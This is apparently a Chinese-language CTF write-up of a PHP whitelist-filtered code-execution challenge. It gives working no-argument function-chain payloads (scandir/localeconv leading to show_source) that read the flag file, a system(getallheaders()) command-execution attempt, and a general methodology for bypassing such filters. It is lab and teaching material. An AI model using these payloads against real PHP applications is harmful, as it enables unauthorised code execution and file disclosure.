---
title: "只有字母和括号的囚笼：PHP 无参 RCE 函数链"
date: 2026-08-21
category: CTF
tags: ["CTF", "Writeup", "Web", "RCE", "PHP"]
summary: "字符白名单执行框：无引号无 $ 无空格，怎么拿 shell？一条无参函数链，从 localeconv 到 show_source。"
draft: false
---

# PHP Code Executor（CTFshow 无参 RCE）

> flag: `CTF{shell_code_base64_bypass}` | 字符白名单执行框 + 无参 RCE 函数链

## 题目
PHP 执行框，输入任意 PHP 代码执行。白名单过滤：

> Only letters, numbers, underscores, parentheses and semicolons are allowed.

即：**无引号、无 `$`、无空格、无点号**。题目名暗示正解是 base64 绕过（shell_code_base64_bypass），但无参链直接出。

## 解法（正确路径）
1. **列目录**：`print_r(scandir(current(localeconv())));`
   - `localeconv()` 返回数组，第 0 个元素是 `.`（当前目录）
   - `scandir('.')` → `[., .., flag.php, index.php]`
2. **读文件**（无引号取文件名）：
   ```php
   show_source(next(array_reverse(scandir(current(localeconv())))));
   ```
   - scandir 结果 `[., .., flag.php, index.php]` → array_reverse → `[index.php, flag.php, .., .]` → next = `flag.php`
   - `show_source('flag.php')` 输出源码 → `$flag = "CTF{shell_code_base64_bypass}";`

## 踩坑记录（我走的弯路）
| 弯路 | 为什么错 |
|------|----------|
| `system(next(getallheaders()))` 请求头传参 | 浏览器/Burp 包的 header 顺序不可控，命令放不到第 2 位；环境里 getallheaders 不可靠 |
| payload 末尾带 CRLF/空行 | **隐形杀手**：服务器检查的是解码后的 `$_POST['code']`，`\r\n` 不在白名单 → 一直 Invalid characters。curl `-d` 明文发送天然无尾随换行，一次通过 |
| 以为 URL 编码（%28/%29）会被拒 | 实测不会——检查发生在解码之后，编码本身安全；真凶只有解码后残留的非法字节 |

## 方法论：字符白名单执行框
1. **看到白名单只有字母数字+括号分号** → 放弃普通命令，上**无参 RCE 函数链**：`localeconv → current → scandir → array_reverse → next → show_source/readfile`
2. **读文件无引号**：文件名的字符串直接用 scandir 返回数组里的元素顶替
3. **隐形字节纪律**：执行框 payload 一个多余字节都不能带——粘贴时末尾回车、聊天复制自带换行、BOM，都是死刑；用 curl `-d` 或 Burp 里删净尾部空行
4. 检查过滤时先想「检查的是原始输入还是解码后的值」——此题是解码后，所以 URL 编码安全、CRLF 致命

## 关联
- 2026-08-19-CTF速刷复盘（进度）
- 2026-08-18-CTF首日四题（Web 入门线）
- 同族题型：命令执行 RCE 过渡题 → 一句话木马/反弹 shell
